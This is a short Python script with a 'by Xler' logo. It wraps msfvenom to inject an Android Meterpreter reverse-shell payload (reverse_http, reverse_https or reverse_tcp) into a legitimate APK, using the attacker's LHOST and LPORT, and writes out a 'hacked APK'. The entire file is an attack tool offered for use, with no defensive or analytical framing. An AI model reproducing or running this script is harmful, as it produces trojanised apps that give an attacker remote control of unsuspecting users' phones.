#!/usr/bin/env python
# coding: utf8

import os  
import colorama 
from colorama import init, Fore, Style

#Printing my logo 
print (colorama.Fore.RED)
print (" ▓▓  ▓▓▓   ▓▓   ▓▓  ▓▓▓▓▓▓  ▓▓   ▓▓ ▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓   ▓▓▓▓▓▓▓             ")
print (" ▓▓  ▓▓ ▓  ▓▓       ▓▓      ▓▓  ▓▓     ▓▓     ▓▓    ▓▓  ▓▓     ▓▓            ")
print (" ▓▓  ▓▓  ▓ ▓▓   ▓▓  ▓▓▓▓▓▓  ▓▓▓▓       ▓▓     ▓▓    ▓▓  ▓▓▓▓▓▓▓             ")  
print (" ▓▓  ▓▓   ▓▓▓   ▓▓  ▓▓      ▓▓  ▓▓     ▓▓     ▓▓    ▓▓  ▓▓    ▓▓             ")
print (" ▓▓  ▓▓    ▓▓ ▓▓▓▓  ▓▓▓▓▓▓  ▓▓   ▓▓    ▓▓      ▓▓▓▓▓▓   ▓▓     ▓▓   @by Xler ")
print("☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰")
print("")
print (Style.RESET_ALL)

#get the information 
apkname = raw_input ("Full path to original APK(Path/to/original.apk):")
print ("Which payload?                          ")
print ("  1. android/meterpreter/reverse_http   ")
print ("  2. android/meterpreter/reverse_https  ")
print ("  3. android/meterpreter/reverse_tcp    ")
payload = raw_input()

if payload == "1":
 pay ="android/meterpreter/reverse_http"
if payload == "2":
 pay ="android/meterpreter/reverse_https" 
if payload == "3":
 pay ="android/meterpreter/reverse_tcp"
if payload > "3":
 print ("You need to choose a number between 1-3!")
 quit()

host = raw_input("LHOST:")
port = raw_input("LPORT:")
nameaf = raw_input("Path for the hacked APK and name(example: Path/to/hacked.apk):")
gen = raw_input ("Start to generate?(y/n)")

#execute the command
if gen == "y":
  os.popen ("".join(("msfvenom -x "+apkname, " -p "+pay, " LHOST="+host, " LPORT="+port, " -o "+nameaf )))

else: 
   quit() 

